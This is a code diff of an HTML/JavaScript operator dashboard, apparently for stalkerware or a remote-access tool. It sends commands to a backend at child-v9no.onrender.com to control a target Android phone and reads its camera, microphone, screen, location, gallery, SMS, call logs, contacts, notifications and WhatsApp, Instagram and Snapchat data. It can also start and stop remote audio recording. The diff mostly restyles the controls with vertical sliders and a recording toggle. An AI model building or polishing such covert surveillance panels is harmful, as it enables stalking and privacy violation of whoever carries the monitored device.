@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Control Panel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Control Center</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -15,6 +15,9 @@
             --accent: #4caf50;
             --offline: #ff4444;
             --cyan: #00f3ff;
+            /* New Slider Variables */
+            --slider-bg: rgba(60, 60, 60, 0.6);
+            --slider-fill: rgba(255, 255, 255, 1);
         }
         body {
             background-color: var(--bg-color);
@@ -24,6 +27,8 @@
             margin: 0; padding: 20px;
             display: flex; flex-direction: column; align-items: center;
             min-height: 100vh;
+            /* Prevent page scroll when using sliders on mobile */
+            touch-action: pan-y; 
         }
         .container {
             width: 100%; max-width: 450px;
@@ -50,23 +55,73 @@
         .label { font-size: 0.65rem; color: var(--text-muted); letter-spacing: 1px; margin-bottom: 5px; }
         .value { font-size: 0.9rem; font-weight: 500; }
         
-        .battery-details { background: rgba(255,255,255,0.03); border-radius: 15px; padding: 15px; margin-bottom: 10px; }
+        .battery-details { background: rgba(255,255,255,0.03); border-radius: 15px; padding: 15px; margin-bottom: 15px; }
         .battery-header { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.85rem; }
         .battery-bar-bg { width: 100%; height: 6px; background: #333; border-radius: 10px; overflow: hidden; }
         .battery-bar-fill { width: 0%; height: 100%; background: var(--accent); transition: 1s ease-in-out; }
 
-        /* Sliders Styling */
-        .slider-section { margin-bottom: 20px; }
-        .slider-row { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
-        .slider-row i { color: var(--text-muted); width: 20px; text-align: center; }
-        input[type=range] {
-            flex: 1; -webkit-appearance: none; background: #333; height: 6px; border-radius: 5px; outline: none;
+        .change-id-btn {
+            text-align: center; font-size: 0.8rem; color: var(--text-muted); 
+            text-decoration: underline; cursor: pointer; margin-bottom: 25px; display: block;
         }
-        input[type=range]::-webkit-slider-thumb {
-            -webkit-appearance: none; width: 18px; height: 18px; background: var(--cyan); border-radius: 50%; cursor: pointer;
+
+        /* --- NEW IPHONE STYLE VERTICAL SLIDERS --- */
+        .controls-grid { 
+            display: grid; 
+            grid-template-columns: repeat(4, 1fr); 
+            /* Row height fixed to make sliders span correctly */
+            grid-auto-rows: 85px; 
+            gap: 12px; 
         }
+
+        .slider-card {
+            grid-row: span 2; /* Makes it tall (takes 2 rows space) */
+            background: var(--slider-bg);
+            border-radius: 25px;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: flex-end; /* Align content to bottom */
+            justify-content: center;
+            border: 1px solid var(--glass-border);
+            touch-action: none; /* Prevents scroll lag on phone */
+        }
+
+        /* The White fill part */
+        .slider-fill {
+            position: absolute;
+            bottom: 0; left: 0; right: 0;
+            background: var(--slider-fill);
+            width: 100%;
+            height: 50%; /* Default height */
+            transition: height 0.1s linear;
+            pointer-events: none; /* Clicks go through to input */
+        }
+
+        /* The Icon inside the slider */
+        .slider-icon {
+            position: absolute;
+            bottom: 25px;
+            font-size: 1.5rem;
+            z-index: 5;
+            color: #555; /* Icon color changes via JS */
+            transition: color 0.2s;
+            pointer-events: none;
+        }
+
+        /* Invisible Range Input on top to capture touches */
+        .vertical-range {
+            position: absolute;
+            width: 200px; /* Needs to be wider because it's rotated */
+            height: 100%;
+            top: 0; left: 50%;
+            transform: translate(-50%, 0) rotate(-90deg); /* Rotate vertical */
+            opacity: 0; /* Invisible */
+            cursor: ns-resize;
+            z-index: 10;
+        }
+        /* ----------------------------------------- */
         
-        .controls-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
         .control-btn {
             background: var(--glass-bg); border-radius: 18px; aspect-ratio: 1/1;
             display: flex; flex-direction: column; align-items: center; justify-content: center;
@@ -76,16 +131,15 @@
         .control-btn:hover { background: rgba(255, 255, 255, 0.15); transform: translateY(-2px); border-color: var(--accent); }
         .control-btn i { font-size: 1.2rem; margin-bottom: 6px; }
         .control-btn span { font-size: 0.6rem; text-align: center; color: #bbb; }
+
+        /* Active state for sound/rec buttons */
+        .control-btn.active-state { background: rgba(255, 255, 255, 0.9); color: #000; }
+        .control-btn.active-state span { color: #333; }
         
         .id-display { 
             margin-bottom: 15px; font-size: 0.8rem; color: var(--cyan); cursor: pointer; 
             border: 1px dashed var(--cyan); padding: 8px 20px; border-radius: 12px;
             background: rgba(0, 243, 255, 0.05); width: 80%; text-align: center;
-        }
-        
-        .change-id-btn {
-            text-align: center; font-size: 0.75rem; color: var(--text-muted); 
-            text-decoration: underline; cursor: pointer; margin-bottom: 20px;
         }
     </style>
 </head>
@@ -129,62 +183,65 @@
             <div id="batteryStatus" style="font-size: 0.7rem; color: var(--text-muted); margin-top: 8px;">Waiting...</div>
         </div>
 
-        <div class="change-id-btn" onclick="resetID()">Change Device ID</div>
+        <span class="change-id-btn" onclick="resetID()">Change Device ID</span>
 
-        <div class="slider-section">
-            <div class="slider-row">
-                <i class="fa-solid fa-sun"></i>
-                <input type="range" min="0" max="100" value="50" onchange="sendCommand('brightness:'+this.value)">
-            </div>
-            <div class="slider-row">
-                <i class="fa-solid fa-volume-high"></i>
-                <input type="range" min="0" max="15" value="8" onchange="sendCommand('volume:'+this.value)">
-            </div>
-        </div>
 
         <div class="controls-grid">
             <div onclick="openView('screen')" class="control-btn"><i class="fa-solid fa-mobile-screen"></i><span>Screen</span></div>
             <div onclick="openView('camera')" class="control-btn"><i class="fa-solid fa-camera"></i><span>Camera</span></div>
-            <div onclick="openView('audio')" class="control-btn"><i class="fa-solid fa-microphone"></i><span>Audio</span></div>
+            
+            <div class="slider-card">
+                <div class="slider-fill" id="brightFill" style="height: 50%;"></div>
+                <i class="fa-solid fa-sun slider-icon" id="brightIcon"></i>
+                <input type="range" min="0" max="100" value="50" class="vertical-range" 
+                       oninput="updateSliderUI('bright', this.value)" 
+                       onchange="sendCommand('brightness:'+this.value)">
+            </div>
+
+            <div class="slider-card">
+                <div class="slider-fill" id="volFill" style="height: 50%;"></div>
+                <i class="fa-solid fa-volume-high slider-icon" id="volIcon"></i>
+                <input type="range" min="0" max="100" value="50" class="vertical-range" 
+                       oninput="updateSliderUI('vol', this.value)" 
+                       onchange="sendCommand('volume:'+this.value)">
+            </div>
+
             <div onclick="openView('location')" class="control-btn"><i class="fa-solid fa-location-dot"></i><span>Location</span></div>
+            <div onclick="openView('audio')" class="control-btn"><i class="fa-solid fa-microphone"></i><span>Audio</span></div>
             
             <div onclick="openView('gallery')" class="control-btn"><i class="fa-solid fa-images"></i><span>Gallery</span></div>
             <div onclick="openView('notifications')" class="control-btn"><i class="fa-regular fa-message"></i><span>Notify</span></div>
-            
             <div class="control-btn" id="soundBtn" onclick="cycleSoundMode()">
                 <i class="fa-solid fa-bell" id="soundIcon"></i><span id="soundText">Normal</span>
             </div>
-
-            <div class="control-btn" onclick="sendCommand('rec_start')"><i class="fa-solid fa-circle-dot"></i><span>Rec</span></div>
+            <div class="control-btn" id="recBtn" onclick="toggleRec()">
+                <i class="fa-solid fa-circle-dot"></i><span>Rec</span>
+            </div>
             
             <div onclick="openDirect('whatsapp.html')" class="control-btn"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></div>
             <div onclick="openDirect('instagram.html')" class="control-btn"><i class="fa-brands fa-instagram"></i><span>Instagram</span></div>
             <div onclick="openDirect('snap.html')" class="control-btn"><i class="fa-brands fa-snapchat"></i><span>Snapchat</span></div>
-            
+            <div onclick="openView('apps')" class="control-btn"><i class="fa-brands fa-google-play"></i><span>Apps</span></div>
+
             <div onclick="openView('call_logs')" class="control-btn"><i class="fa-solid fa-phone"></i><span>Calls</span></div>
             <div onclick="openView('contacts')" class="control-btn"><i class="fa-solid fa-address-book"></i><span>Contacts</span></div>
             <div onclick="openView('sms')" class="control-btn"><i class="fa-solid fa-comments"></i><span>SMS</span></div>
-            <div onclick="openView('apps')" class="control-btn"><i class="fa-brands fa-google-play"></i><span>Apps</span></div>
-        </div>
+            <div class="control-btn" style="opacity:0; pointer-events:none;"></div> </div>
     </div>
 
     <script>
         const API_BASE = 'https://child-v9no.onrender.com';
         let DEVICE_ID = localStorage.getItem('monitoring_id') || '';
 
-        // --- Init Logic to prevent "Searching" flicker ---
+        // --- Init Logic ---
         function initDashboard() {
             if(DEVICE_ID) {
-                // Hide ID input immediately
                 document.getElementById('idInputPanel').style.display = 'none';
-                
-                // Load cached status if available (makes it feel "Connected" instantly)
+                // Load cached model name for instant "Connected" feel
                 const cachedModel = localStorage.getItem('last_model');
                 if(cachedModel) {
                     document.getElementById('deviceName').innerText = cachedModel;
-                    document.getElementById('statusText').innerText = "Connected";
-                    document.getElementById('statusText').style.color = "#4caf50";
-                    document.getElementById('statusDot').className = "dot online";
+                    setStatus(true);
                 }
                 updateDashboard();
             } else {
@@ -197,7 +254,6 @@
             if (id && id.trim() !== "") {
                 DEVICE_ID = id.trim().toUpperCase();
                 localStorage.setItem('monitoring_id', DEVICE_ID);
-                // Hide panel after entering
                 document.getElementById('idInputPanel').style.display = 'none';
                 updateDashboard();
             }
@@ -206,8 +262,22 @@
         function resetID() {
             if(confirm("Change Device ID? Current: " + DEVICE_ID)) {
                 localStorage.removeItem('monitoring_id');
-                localStorage.removeItem('last_model'); // Clear cache
+                localStorage.removeItem('last_model');
                 location.reload();
+            }
+        }
+
+        function setStatus(isOnline) {
+             const dot = document.getElementById('statusDot');
+             const statusText = document.getElementById('statusText');
+             if(isOnline) {
+                dot.className = "dot online";
+                statusText.innerText = "Connected";
+                statusText.style.color = "#4caf50";
+            } else {
+                dot.className = "dot offline";
+                statusText.innerText = "Disconnected";
+                statusText.style.color = "#ff4444";
             }
         }
 
@@ -218,29 +288,13 @@
                 .then(res => res.json())
                 .then(data => {
                     if(data.id) {
-                        // Update Data
                         document.getElementById('deviceName').innerText = data.model || DEVICE_ID;
-                        localStorage.setItem('last_model', data.model || DEVICE_ID); // Cache it
-
+                        localStorage.setItem('last_model', data.model || DEVICE_ID);
                         document.getElementById('androidVer').innerText = data.version || "--";
                         
-                        // Status
-                        const dot = document.getElementById('statusDot');
-                        const statusText = document.getElementById('statusText');
+                        setStatus(data.isOnline);
+                        document.getElementById('networkType').innerText = data.isOnline ? "Online" : "Last Seen";
                         
-                        if(data.isOnline) {
-                            dot.className = "dot online";
-                            statusText.innerText = "Connected";
-                            statusText.style.color = "#4caf50";
-                            document.getElementById('networkType').innerText = "Online";
-                        } else {
-                            dot.className = "dot offline";
-                            statusText.innerText = "Disconnected";
-                            statusText.style.color = "#ff4444";
-                            document.getElementById('networkType').innerText = "Last Seen";
-                        }
-                        
-                        // Battery
                         const battery = data.battery || 0;
                         document.getElementById('batteryPercent').innerText = battery + "%";
                         document.getElementById('batteryFill').style.width = battery + "%";
@@ -250,12 +304,11 @@
                 .catch(err => console.log("Connection Error:", err));
         }
 
-        // --- Navigation Logic ---
+        // --- Navigation ---
         function openView(page) {
             if(!DEVICE_ID) return askID();
             window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
         }
-
         function openDirect(filename) {
             if(!DEVICE_ID) return askID();
             window.location.href = `${filename}?id=${DEVICE_ID}`;
@@ -268,10 +321,24 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ device_id: DEVICE_ID, command: action })
             });
-            // Optional: Alert hata diya taaki smooth lage, bas console log karega
             console.log("Sent: " + action);
         }
 
+        // --- New Slider UI Logic ---
+        function updateSliderUI(type, val) {
+            // Update the white fill height
+            document.getElementById(`${type}Fill`).style.height = val + "%";
+            
+            // Change icon color based on fill level (dark icon on white fill)
+            const icon = document.getElementById(`${type}Icon`);
+            if(val > 25) {
+                icon.style.color = "#333"; 
+            } else {
+                icon.style.color = "#fff";
+            }
+        }
+
+        // --- Sound & Rec Logic ---
         let modes = ['normal', 'vibrate', 'silent'];
         let icons = ['fa-bell', 'fa-vibration', 'fa-bell-slash'];
         let labels = ['Normal', 'Vibrate', 'Silent'];
@@ -281,15 +348,37 @@
             currentModeIndex = (currentModeIndex + 1) % 3;
             const icon = document.getElementById('soundIcon');
             const text = document.getElementById('soundText');
+            const btn = document.getElementById('soundBtn');
+            
             icon.className = `fa-solid ${icons[currentModeIndex]}`;
             text.innerText = labels[currentModeIndex];
+
+            if(modes[currentModeIndex] === 'silent' || modes[currentModeIndex] === 'vibrate') {
+                 btn.classList.add('active-state');
+            } else {
+                 btn.classList.remove('active-state');
+            }
+            
             sendCommand(modes[currentModeIndex]);
+        }
+
+        let isRecording = false;
+        function toggleRec() {
+            isRecording = !isRecording;
+            const btn = document.getElementById('recBtn');
+            if(isRecording) {
+                btn.classList.add('active-state');
+                btn.querySelector('span').innerText = "Stop Rec";
+                sendCommand('rec_start');
+            } else {
+                btn.classList.remove('active-state');
+                 btn.querySelector('span').innerText = "Rec";
+                sendCommand('rec_stop');
+            }
         }
 
         // Auto Refresh Loop
         setInterval(updateDashboard, 5000);
-        
-        // Start
         window.onload = initDashboard;
     </script>
 </body>
